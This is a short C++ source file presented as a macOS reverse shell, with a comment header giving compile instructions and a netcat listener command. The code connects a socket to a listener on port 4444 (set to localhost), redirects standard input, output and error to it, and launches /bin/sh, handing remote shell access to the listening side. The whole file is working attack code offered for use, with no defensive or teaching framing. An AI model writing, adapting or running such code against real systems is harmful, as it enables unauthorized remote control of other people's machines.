// ============================================================
// reverse_shell.cpp — macOS reverse shell
// ------------------------------------------------------------
// Compile: clang++ -O2 -o rev reverse_shell.cpp -framework CoreFoundation
// Run:    Start listener first:  nc -lvnp 4444
// Note:   Requires network access; works without root.
// ============================================================
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>

int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in a{};
    a.sin_family = AF_INET;
    a.sin_port = htons(4444);
    inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
    connect(s, (sockaddr*)&a, sizeof(a));

    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    execl("/bin/sh", "sh", nullptr);
    return 0;
}
